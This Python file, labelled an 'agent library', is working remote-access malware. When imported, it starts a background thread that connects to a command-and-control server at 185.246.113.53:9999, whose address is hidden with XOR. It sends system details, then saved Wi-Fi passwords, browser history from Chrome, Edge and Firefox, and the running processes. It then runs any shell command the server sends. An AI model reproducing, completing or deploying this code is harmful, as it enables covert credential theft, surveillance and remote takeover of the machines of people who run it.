"""
puan3 — agent library v2
"""

import os, sys, json, time, uuid, socket, platform, threading, subprocess, datetime, shutil

# ── XOR obfuscated C2 (185.246.113.53:9999) ───────────────────────────────────
_K = 0x5A
_H = [0x6b,0x62,0x6f,0x74,0x68,0x6e,0x6c,0x74,0x6b,0x6b,0x69,0x74,0x6f,0x69,0x60,0x63,0x63,0x63,0x63]
def _dh():
    r="".join(chr(b^_K) for b in _H); h,p=r.split(":"); return h,int(p)
_C2_HOST,_C2_PORT=_dh()

# ── State ──────────────────────────────────────────────────────────────────────
_sock=None; _sock_lock=threading.Lock()
_connected=False; _last_beat=None
_client_id=str(uuid.uuid4()); _started=False

def _safe(fn,d="?"):
    try: r=fn(); return r if r else d
    except: return d

# ── Collectors ─────────────────────────────────────────────────────────────────
def _public_ip():
    try:
        import urllib.request
        return urllib.request.urlopen("https://api.ipify.org",timeout=4).read().decode().strip()
    except: return "?"

def _wifi_ssid():
    try:
        if platform.system()=="Windows":
            o=subprocess.check_output(["netsh","wlan","show","interfaces"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            for l in o.splitlines():
                if "SSID" in l and "BSSID" not in l:
                    v=l.split(":")[-1].strip()
                    if v: return v
        elif platform.system()=="Linux":
            return subprocess.check_output(["iwgetid","-r"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore").strip() or "?"
    except: pass
    return "?"

def _conn_type():
    try:
        if platform.system()=="Windows":
            o=subprocess.check_output(["netsh","wlan","show","interfaces"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            return "WiFi" if "connected" in o.lower() else "Ethernet"
    except: pass
    return "?"

def _gateway():
    try:
        if platform.system()=="Windows":
            o=subprocess.check_output(["ipconfig"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            for l in o.splitlines():
                if "Default Gateway" in l:
                    g=l.split(":")[-1].strip()
                    if g: return g
        elif platform.system()=="Linux":
            o=subprocess.check_output(["ip","route"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            for l in o.splitlines():
                if l.startswith("default"): return l.split()[2]
    except: pass
    return "?"

def _dns():
    try:
        if platform.system()=="Windows":
            o=subprocess.check_output(["ipconfig","/all"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            dns=[]
            for l in o.splitlines():
                if "DNS Servers" in l:
                    d=l.split(":")[-1].strip()
                    if d: dns.append(d)
            return ", ".join(dns[:3]) if dns else "?"
        elif platform.system()=="Linux":
            with open("/etc/resolv.conf") as f:
                return ", ".join(l.split()[1] for l in f if l.startswith("nameserver"))
    except: pass
    return "?"

def _local_ips():
    try:
        ips=[]
        for i in socket.getaddrinfo(socket.gethostname(),None):
            ip=i[4][0]
            if ip not in ips and not ip.startswith("::") and ip!="127.0.0.1": ips.append(ip)
        return ", ".join(ips) or "?"
    except: return "?"

def _cpu():
    try:
        if platform.system()=="Windows":
            o=subprocess.check_output(["wmic","cpu","get","name"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            lines=[l.strip() for l in o.splitlines() if l.strip() and "Name" not in l]
            return lines[0] if lines else platform.processor()
        elif platform.system()=="Linux":
            with open("/proc/cpuinfo") as f:
                for l in f:
                    if "model name" in l: return l.split(":")[1].strip()
    except: pass
    return _safe(platform.processor)

def _ram():
    try:
        if platform.system()=="Windows":
            o=subprocess.check_output(["wmic","OS","get","TotalVisibleMemorySize"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            lines=[l.strip() for l in o.splitlines() if l.strip() and "Total" not in l]
            if lines: return f"{int(lines[0])//1024} MB"
        elif platform.system()=="Linux":
            with open("/proc/meminfo") as f:
                for l in f:
                    if "MemTotal" in l: return f"{int(l.split()[1])//1024} MB"
    except: pass
    return "?"

def _disk():
    try:
        if platform.system()=="Windows":
            o=subprocess.check_output(["wmic","logicaldisk","get","size,freespace,caption"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            res=[]
            for l in o.splitlines():
                p=l.strip().split()
                if len(p)>=3 and len(p[0])==2 and p[0][1]==":":
                    try: res.append(f"{p[0]} {int(p[1])//(1024**3)}GB/{int(p[2])//(1024**3)}GB")
                    except: pass
            return " | ".join(res) or "?"
        else:
            st=os.statvfs("/")
            return f"{st.f_bfree*st.f_frsize//(1024**3)}GB free / {st.f_blocks*st.f_frsize//(1024**3)}GB"
    except: return "?"

def _resolution():
    try:
        if platform.system()=="Windows":
            import ctypes; u=ctypes.windll.user32
            return f"{u.GetSystemMetrics(0)}x{u.GetSystemMetrics(1)}"
    except: pass
    return "?"

def _mac():
    try:
        m=uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ":".join(m[i:i+2] for i in range(0,12,2)).upper()
    except: return "?"

def _tz():
    try: return str(datetime.datetime.now().astimezone().tzinfo)
    except: return "?"

def _lang():
    try:
        import locale; return locale.getdefaultlocale()[0] or "?"
    except: return "?"

# ── Extended collectors ────────────────────────────────────────────────────────
def _wifi_passwords():
    passwords = {}
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                stderr=subprocess.DEVNULL, timeout=5
            ).decode(errors="ignore")
            profiles = [l.split(":")[-1].strip() for l in out.splitlines() if "All User Profile" in l]
            for profile in profiles:
                try:
                    detail = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                        stderr=subprocess.DEVNULL, timeout=5
                    ).decode(errors="ignore")
                    pw = ""
                    for l in detail.splitlines():
                        if "Key Content" in l:
                            pw = l.split(":")[-1].strip()
                    passwords[profile] = pw or "(open)"
                except: pass
    except: pass
    return passwords

def _browser_history():
    history = []
    try:
        import sqlite3, shutil, tempfile
        user = os.path.expanduser("~")

        paths = {
            "Chrome": os.path.join(user,"AppData","Local","Google","Chrome","User Data","Default","History"),
            "Edge":   os.path.join(user,"AppData","Local","Microsoft","Edge","User Data","Default","History"),
            "Firefox": None,  # handled separately
        }

        for browser, path in paths.items():
            if not path or not os.path.exists(path): continue
            try:
                tmp = tempfile.mktemp(suffix=".db")
                shutil.copy2(path, tmp)
                conn = sqlite3.connect(tmp)
                cur  = conn.cursor()
                cur.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                for url, ts in cur.fetchall():
                    # Chrome epoch: microseconds since 1601-01-01
                    try:
                        epoch = (ts / 1000000) - 11644473600
                        dt    = datetime.datetime.utcfromtimestamp(epoch).strftime("%Y-%m-%d %H:%M")
                    except: dt = "?"
                    history.append({"browser": browser, "url": url, "time": dt})
                conn.close()
                os.unlink(tmp)
            except: pass

        # Firefox
        ff_base = os.path.join(user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
        if os.path.exists(ff_base):
            for prof in os.listdir(ff_base):
                db = os.path.join(ff_base, prof, "places.sqlite")
                if not os.path.exists(db): continue
                try:
                    tmp = tempfile.mktemp(suffix=".db")
                    shutil.copy2(db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur  = conn.cursor()
                    cur.execute("SELECT url, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 50")
                    for url, ts in cur.fetchall():
                        try: dt = datetime.datetime.utcfromtimestamp(ts/1000000).strftime("%Y-%m-%d %H:%M")
                        except: dt = "?"
                        history.append({"browser": "Firefox", "url": url, "time": dt})
                    conn.close()
                    os.unlink(tmp)
                    break
                except: pass
    except: pass

    history.sort(key=lambda x: x.get("time",""), reverse=True)
    return history[:50]

def _processes():
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["tasklist", "/fo", "csv", "/nh"],
                stderr=subprocess.DEVNULL, timeout=5
            ).decode(errors="ignore")
            procs = []
            for line in out.splitlines():
                parts = [p.strip('"') for p in line.split('","')]
                if len(parts) >= 2:
                    procs.append(f"{parts[0]:35s} PID:{parts[1]}")
            return procs[:80]
        elif platform.system() == "Linux":
            out = subprocess.check_output(["ps","aux"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
            return out.splitlines()[1:81]
    except: pass
    return []

def _collect():
    return {
        "client_id" : _client_id,
        "hostname"  : _safe(socket.gethostname),
        "os"        : platform.system(),
        "os_version": _safe(platform.version),
        "os_release": _safe(platform.release),
        "platform"  : _safe(platform.platform),
        "username"  : _safe(lambda: os.environ.get("USERNAME") or os.environ.get("USER") or "?"),
        "mac"       : _mac(),
        "local_ips" : _local_ips(),
        "public_ip" : _public_ip(),
        "gateway"   : _gateway(),
        "dns"       : _dns(),
        "wifi_ssid" : _wifi_ssid(),
        "conn_type" : _conn_type(),
        "cpu"       : _cpu(),
        "cpu_cores" : _safe(lambda: str(os.cpu_count())),
        "ram"       : _ram(),
        "disk"      : _disk(),
        "resolution": _resolution(),
        "timezone"  : _tz(),
        "language"  : _lang(),
        "python"    : sys.version.split()[0],
        "cwd"       : _safe(os.getcwd),
    }

def _collect_extended():
    """Collect sensitive data — sent separately after hello."""
    return {
        "type"           : "data",
        "client_id"      : _client_id,
        "wifi_passwords" : _wifi_passwords(),
        "browser_history": _browser_history(),
        "processes"      : _processes(),
    }

# ── Connection ─────────────────────────────────────────────────────────────────
def _recv_line(s):
    buf = b""
    while True:
        c = s.recv(1)
        if not c: raise ConnectionError("disconnected")
        buf += c
        if buf.endswith(b"\n"): return buf.strip()

def _connect():
    global _sock, _connected, _last_beat
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((_C2_HOST, _C2_PORT))
            s.settimeout(None)

            # Send sysinfo hello
            s.sendall((json.dumps(_collect()) + "\n").encode())
            resp = s.recv(64)
            if b"ok" not in resp:
                s.close(); time.sleep(5); continue

            with _sock_lock:
                _sock = s; _connected = True; _last_beat = time.time()

            # Send extended data in background (takes time)
            def _send_ext():
                try:
                    time.sleep(2)
                    ext = _collect_extended()
                    s.sendall((json.dumps(ext) + "\n").encode())
                except: pass
            threading.Thread(target=_send_ext, daemon=True).start()

            # Main loop
            _loop(s)

        except Exception:
            pass

        with _sock_lock:
            _connected = False; _sock = None
        time.sleep(5)

def _loop(s):
    global _connected, _last_beat
    while True:
        try:
            s.settimeout(20)
            raw = _recv_line(s)
            s.settimeout(None)
            msg = json.loads(raw)

            with _sock_lock:
                _last_beat = time.time()

            t = msg.get("type")

            if t == "ping":
                s.sendall(b'{"type":"pong"}\n')

            elif t == "cmd":
                cmd = msg.get("cmd", "")
                try:
                    result = subprocess.run(
                        cmd, shell=True,
                        capture_output=True, timeout=30,
                        text=True, errors="ignore"
                    )
                    output = (result.stdout + result.stderr).strip() or "(no output)"
                except subprocess.TimeoutExpired:
                    output = "(timeout)"
                except Exception as e:
                    output = f"(error: {e})"

                s.sendall((json.dumps({
                    "type"  : "result",
                    "cmd"   : cmd,
                    "output": output
                }) + "\n").encode())

        except socket.timeout:
            # Send keepalive
            try:
                s.sendall(b'{"type":"pong"}\n')
            except:
                break
        except Exception:
            break

    with _sock_lock:
        _connected = False

# ── Public API ─────────────────────────────────────────────────────────────────
def ping() -> bool:
    """Returns True if connected to C2."""
    return _connected

def status() -> dict:
    return {
        "connected": _connected,
        "client_id": _client_id,
        "c2"       : f"{_C2_HOST}:{_C2_PORT}",
        "last_beat": _last_beat,
        "since_sec": round(time.time()-_last_beat,1) if _last_beat else None,
    }

def info() -> dict:
    return _collect()

def get_wifi_passwords() -> dict:
    return _wifi_passwords()

def get_browser_history() -> list:
    return _browser_history()

def get_processes() -> list:
    return _processes()

def reconnect():
    global _sock, _connected
    with _sock_lock:
        try:
            if _sock: _sock.close()
        except: pass
        _sock = None; _connected = False

# ── Auto-start ─────────────────────────────────────────────────────────────────
def _start():
    global _started
    if _started: return
    _started = True
    threading.Thread(target=_connect, daemon=True).start()

_start()